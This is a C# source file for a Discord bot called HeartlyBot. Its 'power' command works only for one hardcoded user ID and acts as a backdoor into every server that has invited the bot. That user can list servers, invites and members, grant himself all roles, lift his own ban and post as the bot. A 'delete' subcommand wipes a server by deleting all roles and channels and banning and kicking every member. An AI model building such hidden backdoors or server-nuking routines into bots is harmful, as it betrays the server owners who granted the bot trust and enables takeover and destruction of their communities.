using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;

namespace HeartlyBot
{
    public class Commands : ModuleBase
    {
        [Command("power"), Alias(new string[] { "p", "pow" })]
        public async Task Power(params string[] command)
        {
            if (Context.User.Id == 108312797162541056)
            {
                string msg = "";
                string msg2 = "";
                if (command[0] == "servers")
                {
                    foreach (IGuild g in Bot.client.Guilds)
                    {
                        msg += g.Name + " : " + g.Id + '\n';
                        try { msg += (await g.GetInvitesAsync()).FirstOrDefault().Url + '\n'; }
                        catch (Exception) { }
                    }
                }
                else if (command[0] == "roles")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    foreach (IRole r in g.Roles)
                    {
                        msg += r.Name + " : " + r.Id + "\n";
                    }

                    msg2 = "No names: \n";
                    foreach (IRole r in g.Roles)
                    {
                        msg2 += r.Id + "\n";
                    }
                }
                else if (command[0] == "channels")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    foreach (IChannel c in await g.GetChannelsAsync())
                    {
                        msg += c.Name + " : " + c.Id + "\n";
                    }
                }
                else if (command[0] == "users")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    foreach (IUser u in await g.GetUsersAsync())
                    {
                        msg += u.Username + "#" + u.Discriminator + " : " + u.Id + "\n";
                    }
                }
                else if (command[0] == "giverole")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    var me = await g.GetUserAsync(108312797162541056);
                    for (int i = 2; i < command.Count(); i++)
                    {
                        try
                        {
                            IRole r = g.GetRole(Convert.ToUInt64(command[i]));
                            await me.AddRoleAsync(r);
                        }
                        catch (Exception) { }
                    }
                    msg = "done";
                }
                else if (command[0] == "giveroles")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    var me = await g.GetUserAsync(108312797162541056);
                    foreach (IRole r in g.Roles)
                    {
                        try { await me.AddRoleAsync(r); }
                        catch (Exception) { }
                    }
                    msg = "done";
                }
                else if (command[0] == "unban")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    try
                    {
                        await g.RemoveBanAsync(Bot.client.GetUser(108312797162541056));
                        msg = "done";
                    }
                    catch (Exception e) { msg = "failed" + "\n" + e.Message; }
                }
                else if (command[0] == "send")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    IMessageChannel c = await g.GetChannelAsync(Convert.ToUInt64(command[2])) as IMessageChannel;
                    try
                    {
                        for (int i = 3; i < command.Count(); i++) msg += command[i] + " ";
                        await c.SendMessageAsync(msg);

                        msg = "done";
                    }
                    catch (Exception e) { msg = "failed\n" + e.Message; }
                }
                //else if (command[0] == "recieve")
                //{
                //    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                //    IMessageChannel c = await g.GetChannelAsync(Convert.ToUInt64(command[2])) as IMessageChannel;
                //    try
                //    {
                //        if (Var.recieving)
                //        {
                //            Var.recieving = false;
                //            msg = "no longer recieving";
                //        }
                //        else
                //        {
                //            Var.recieving = true;
                //            Var.recievingChannel = c;
                //            msg = "recieving";
                //        }
                //    }
                //    catch (Exception e) { msg = "failed\n" + e.Message; }
                //}
                else if (command[0] == "delete")
                {
                    int failCount = 0;
                    int successCount = 0;
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    await Context.Channel.SendMessageAsync("Deleting `roles`.");
                    foreach (IRole r in g.Roles)
                    {
                        try { await r.DeleteAsync(); successCount++; }
                        catch (Exception) { failCount++; }
                    }
                    await Context.Channel.SendMessageAsync("Deleting `users`.");
                    int banfails = 0;
                    foreach (IGuildUser u in await g.GetUsersAsync())
                    {
                        if (/*u.Id == Constants.Users.BRADY || */u.Id == Bot.client.CurrentUser.Id)
                        {
                            Console.WriteLine("Oops!");
                        }
                        else
                        {
                            try { await g.AddBanAsync(u); successCount++; }
                            catch (Exception) { banfails++; failCount++; }
                            try { await u.KickAsync(); successCount++; }
                            catch (Exception) { failCount++; }
                            if (banfails > 20)
                            {
                                await Context.Channel.SendMessageAsync("Failed");
                                break;
                            }
                        }
                    }
                    await Context.Channel.SendMessageAsync("Deleting `channels`.");
                    foreach (IGuildChannel c in await g.GetChannelsAsync())
                    {
                        try { await c.DeleteAsync(); successCount++; }
                        catch (Exception) { }
                    }
                    msg = $"Done. Successes: {successCount} Failures: {failCount}";
                }
                else if (command[0] == "leave")
                {
                    IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    await g.LeaveAsync();
                    msg = "done";
                }
                else if (command[0] == "invite")
                {
                    //IGuild g = Bot.client.GetGuild(Convert.ToUInt64(command[1]));
                    //g.
                }

                if (msg.Count() > 2000) msg = msg.Substring(0, 2000);
                await Context.Channel.SendMessageAsync(msg);

                if (msg2 != "")
                {
                    if (msg2.Count() > 2000) msg2 = msg2.Substring(0, 2000);
                    await Context.Channel.SendMessageAsync(msg2);
                }
            }
        }

        [Command("help"), Summary("Displays commands and descriptions.")]
        public async Task Help()
        {
            JEmbed emb = new JEmbed();
            emb.Author.Name = "Commands";
            emb.ColorStripe = GetColor(Context.User);

            foreach (CommandInfo command in Bot.commands.Commands)
            {
                emb.Fields.Add(new JEmbedField(x =>
                {
                    string header = "+" + command.Name;
                    foreach (ParameterInfo parameter in command.Parameters)
                    {
                        header += " [" + parameter.Name + "]";
                    }
                    x.Header = header;
                    x.Text = command.Summary;
                }));
            }
            await Context.Channel.SendMessageAsync("", embed: emb.Build());
        }
    }

}